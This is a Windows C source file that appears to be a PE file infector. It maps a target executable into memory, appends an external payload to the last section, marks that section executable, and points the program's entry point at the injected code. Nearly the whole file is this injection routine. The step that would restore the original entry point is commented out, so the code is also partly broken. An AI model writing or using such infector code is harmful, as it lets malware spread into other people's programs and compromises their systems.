#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int ac, char **av) {
    if (ac != 2) {
        return 1;
    }
    char *name = av[1];
    extern char payload[];
    extern char __begin_of_code;
    extern LONGLONG __end_of_code;

    DWORD sizeOfCode = (DWORD) ((PUCHAR) &__end_of_code + sizeof(LONGLONG) - (PUCHAR)&__begin_of_code);
    extern LONGLONG delta;
    HANDLE *hFile;
    hFile = CreateFile(name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile()... ERROR\n");
        return (-1);
    }
    printf("CreateFile()... SUCCESS\n");
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + sizeOfCode;
    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);

    if (hMapFile == NULL)
    {
        DWORD err = GetLastError();
        printf("Erreur de CreateFileMapping: %d\n", err);
        return err;
    }

    PUCHAR lpMapAdr = (PUCHAR) MapViewOfFile(
        hMapFile,
        FILE_MAP_ALL_ACCESS,
        0,
        0,
        0
    );

    printf("MZ : %c%c\n", ((PUCHAR)lpMapAdr)[0], ((PUCHAR)lpMapAdr)[1]);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpMapAdr;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(lpMapAdr + pDosHeader->e_lfanew);
    printf("PE: %s\n", (LPCSTR)((PUCHAR) pNtHeader ));

    IMAGE_FILE_HEADER imageFileHeader = pNtHeader->FileHeader;

    WORD nbSections =  imageFileHeader.NumberOfSections;

    IMAGE_OPTIONAL_HEADER64 optHeader = pNtHeader->OptionalHeader;

    DWORD sectionAlign = optHeader.SectionAlignment;

    DWORD entryRVA = optHeader.AddressOfEntryPoint;

    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNtHeader);
    // OU
//    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER) ((PUCHAR) pNtHeader + sizeof(IMAGE_NT_HEADERS64));
    

    printf("Number of sections: %i and ali %i\n", nbSections, sectionAlign);

    PIMAGE_SECTION_HEADER section = &sectionHeaders[0];
    for (int i = 0; i < nbSections; ++i) {
        section = &sectionHeaders[i];
        
        printf("Name of section %i is : %s\n", i + 1, section->Name);

    }
    PIMAGE_SECTION_HEADER pLastSection = section;

 

//    PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER) ((PUCHAR)pSectionHeader + (pNtHeader->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER))

    DWORD OldEntry = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    DWORD szData = pLastSection->SizeOfRawData;
    DWORD NewEntry = pLastSection->VirtualAddress + szData;
    LONGLONG forDelta = (LONGLONG) OldEntry - (LONGLONG) NewEntry;
    __end_of_code = (LONGLONG) sizeOfCode;
    // Protect
    DWORD oldProtect;
    VirtualProtect(&delta, 4096, PAGE_READWRITE, &oldProtect);
//    delta = forDelta // segalt
    PUCHAR dstCpy = lpMapAdr + pLastSection->PointerToRawData + szData;

    memcpy(dstCpy, payload, sizeOfCode);

    pLastSection->Characteristics |= IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    pLastSection->SizeOfRawData += sizeOfCode;
    pLastSection->Misc.VirtualSize += sizeOfCode;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = NewEntry;

    printf("Last VirtAddr %x\n", pLastSection->VirtualAddress);

        if ((CloseHandle(hFile)) == 0) {
          printf("CloseHandle()... ERROR\n");
          return (-1);
        }
    
}